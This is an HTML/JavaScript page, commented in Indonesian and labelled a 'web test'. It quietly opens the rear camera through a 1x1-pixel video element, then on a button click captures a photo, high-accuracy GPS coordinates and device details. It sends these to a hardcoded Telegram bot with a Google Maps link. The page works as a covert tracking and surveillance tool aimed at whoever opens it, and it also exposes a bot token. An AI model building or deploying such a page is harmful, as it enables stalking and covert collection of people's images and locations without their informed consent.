<!DOCTYPE html>
<html>
<head>
  <title>Web Test - Capture Photo, GPS, and Battery Info</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
</head>
<body>
  <h1>Web Test - Capture Photo, GPS, and Battery Info</h1>
  <video id="video" width="1" height="1" autoplay playsinline></video>
  <button id="capture-btn">Ambil Foto</button>
  <canvas id="canvas" width="1" height="1" style="display: none;"></canvas>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';

    const video = document.getElementById('video');
    const captureButton = document.getElementById('capture-btn');
    let isProcessing = false;

    // Inisialisasi kamera
    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'environment',
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          }
        });
        video.srcObject = stream;
        video.onloadedmetadata = () => video.play();
      } catch (err) {
        handleError('Kamera', err);
      }
    }

    // Handler utama
    captureButton.onclick = async () => {
      if (isProcessing) return;
      isProcessing = true;
      
      try {
        const { imageDataURL, deviceInfo, position } = await captureData();
        await sendToTelegram(imageDataURL, position, deviceInfo);
        alert('Data berhasil dikirim!');
      } catch (error) {
        handleError('Pengiriman', error);
      } finally {
        isProcessing = false;
      }
    };

    // Proses pengambilan data
    async function captureData() {
      const imageDataURL = await capturePhoto();
      const position = await getLocation();
      const deviceInfo = await getDeviceInfo();
      
      return { imageDataURL, deviceInfo, position };
    }

    // Ambil foto
    async function capturePhoto() {
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);
      
      return canvas.toDataURL('image/jpeg', 0.8);
    }

    // Dapatkan lokasi
    async function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) reject(new Error('Geolocation tidak didukung'));
        
        navigator.geolocation.getCurrentPosition(
          resolve,
          err => reject(new Error(`Gagal mendapatkan lokasi: ${err.message}`)),
          {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          }
        );
      });
    }

    // Dapatkan info perangkat
    async function getDeviceInfo() {
      const battery = await getBatteryInfo().catch(() => null);
      
      return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        screen: `${window.screen.width}x${window.screen.height}`,
        battery: battery ? `${Math.round(battery.level * 100)}%` : 'Tidak didukung',
        orientation: screen.orientation?.type || 'Tidak didukung',
        touchSupport: navigator.maxTouchPoints > 0,
        os: getOS()
      };
    }

    // Dapatkan info baterai
    async function getBatteryInfo() {
      if (navigator.getBattery) {
        return navigator.getBattery();
      }
      throw new Error('Battery API tidak didukung');
    }

    // Deteksi OS
    function getOS() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) return 'Android';
      if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
      if (/Win/.test(ua)) return 'Windows';
      if (/Mac/.test(ua)) return 'MacOS';
      if (/Linux/.test(ua)) return 'Linux';
      return 'Unknown';
    }

    // Kirim ke Telegram
    async function sendToTelegram(imageDataURL, position, deviceInfo) {
      const formData = new FormData();
      const blob = dataURItoBlob(imageDataURL);
      const { latitude, longitude, accuracy } = position.coords;
      const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'photo.jpg');
      formData.append('caption', `
📡 Lokasi: [Google Maps](${mapsLink})
📍 Koordinat: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
🎯 Akurasi: ${Math.round(accuracy)} meter

📱 Perangkat:
${Object.entries(deviceInfo).map(([k, v]) => `• ${k}: ${v}`).join('\n')}
      `);

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Telegram API: ${error.description}`);
      }
    }

    // Konversi DataURI ke Blob
    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      
      return new Blob([ab], { type: mime });
    }

    // Error handling
    function handleError(context, error) {
      console.error(`[${context}]`, error);
      alert(`ERROR: ${error.message}`);
    }

    // Init
    if (navigator.mediaDevices) {
      initCamera();
    } else {
      alert('Browser tidak mendukung akses kamera!');
    }
  </script>
</body>
</html>
